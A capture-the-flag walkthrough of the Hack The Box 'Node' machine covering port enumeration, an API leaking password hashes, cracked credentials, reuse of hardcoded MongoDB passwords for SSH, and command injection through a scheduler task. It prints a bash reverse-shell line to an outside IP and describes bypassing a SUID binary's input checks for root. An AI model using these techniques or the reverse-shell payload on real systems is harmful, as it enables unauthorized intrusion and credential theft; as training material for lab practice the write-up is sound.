Title: HTB Node box writeup
Tags: oscp, htb, nodejs, os command injection, mongodb
Summary: Walkthrough for this one
Date: 2020-09-27 22:00
Status: published

# Enumeration
nmap sS all range:
```text
    Nmap 7.80 scan initiated Fri Sep 25 19:13:46 2020 as: nmap -sS -p- -oA enum/nmap-sS-all 10.10.10.58
    Nmap scan report for node.htb (10.10.10.58)
    Host is up (0.059s latency).
    Not shown: 65533 filtered ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    3000/tcp open  ppp
    Nmap done at Fri Sep 25 19:15:45 2020 -- 1 IP address (1 host up) scanned in 119.96 seconds
```
Scripted scan of these:
```text
    Nmap 7.80 scan initiated Fri Sep 25 19:18:55 2020 as: nmap -sC -A -T4 -p22,3000 -oA enum/nmap-sCAT4-open 10.10.10.58
    Nmap scan report for node.htb (10.10.10.58)
    Host is up (0.056s latency).
    PORT     STATE SERVICE            VERSION
    22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
    |   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
    |_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
    3000/tcp open  hadoop-tasktracker Apache Hadoop
    | hadoop-datanode-info: 
    |_  Logs: /login
    | hadoop-tasktracker-info: 
    |_  Logs: /login
    |_http-title: MyPlace
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE (using port 22/tcp)
    HOP RTT      ADDRESS
    1   55.65 ms 10.10.14.1
    2   57.76 ms node.htb (10.10.10.58)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Fri Sep 25 19:19:14 2020 -- 1 IP address (1 host up) scanned in 18.92 seconds
```
Also tried to scan top 1000 UDP ports, but nothing seems to be available there.
Whatweb told that about the website at 3000:
```text
    http://node.htb:3000 [200 OK] Bootstrap
    Country[RESERVED][ZZ]
    HTML5, IP[10.10.10.58]
    JQuery, Script[text/javascript]
    Title[MyPlace]
    X-Powered-By[Express]
    X-UA-Compatible[IE=edge]
```
Looks like web API exposes some interesting info about users:

![mark info](/cstatic/htb-node/api-mark.png)

GET request to `/api/users` will reveal all the available users info. Response:
```json
[
   {
      "_id":"59a7365b98aa325cc03ee51c",
      "username":"myP14ceAdm1nAcc0uNT",
      "password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
      "is_admin":true
   },
   {
      "_id":"59a7368398aa325cc03ee51d",
      "username":"tom",
      "password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
      "is_admin":false
   },
   {
      "_id":"59a7368e98aa325cc03ee51e",
      "username":"mark",
      "password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
      "is_admin":false
   },
   {
      "_id":"59aa9781cced6f1d1490fce9",
      "username":"rastating",
      "password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
      "is_admin":false
   }
]
```
Some non-privileges user passwords are:
```text
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
```

# Exploitation
The hash for `myP14ceAdm1nAcc0uNT` account is 'googlable' and maps to `manchester`.
These credentials allow to download some `myplace.backup` which is a password-protected 
ZIP archive encoded in base64. Password was almost immediately cracked with rockyou -
`magicword`. Within is likely the code for the hosted application, a node.js app.
Here's the `package.json`:
```json
{
    "name": "myplace",
    "description": "A secure place to meet new people.",
    "version": "1.0.0",
    "private": true,
    "dependencies": {
        "express": "4.15.x",
        "express-session": "1.15.x",
        "body-parser": "1.17.x",
        "mongodb": "2.2.x"
    }
}
```
Noticed creds for mongo instance: `mark:5AYRft73VtFpc84k@localhost:27017` in app.js.
They work for SSH and we're in:

![mark shell](/cstatic/htb-node/mark-shell.png)

There is interesting process running running `/var/scheduler/app.js`:

![scheduler js](/cstatic/htb-node/scheduler-js.png)

Looks like it's a way to execute code as tom:
```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

So to get tom's shell it's only necessary to insert proper document into the
`scheduler` collection, in this manner: `db.tasks.insert({cmd: '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.9/443 0>&1"'})`.
The shell:

![tom shell](/cstatic/htb-node/unpriv-shell.png)

# Privilege escalation
I tried to find files that owned by `admin` group and stumbled upon `/usr/local/bin/backup`
which is also used in MyPlace app to generate source code mirror. Interesting part is that this
binary has suid bit set and owned by root. The executable looks to be custom and has some calls
to the os shell within. It uses `zip` utility:

![zip util str](/cstatic/htb-node/zip-invocation.png)

And after some sanity checks on input it just invokes this, using passed command line parameter
as the part of the command line for zip utility:

![system-invocation](/cstatic/htb-node/system-invocation.png)

However, sanity checks are not thorough enough and may be bypassed to acquire root shell:

![root shell](/cstatic/htb-node/root-shell.png)

The main lesson here was to look at the very detail found, because I overlooked `backup`
utility at first, despite that I found it quite quickly while performing user groups enumeration.
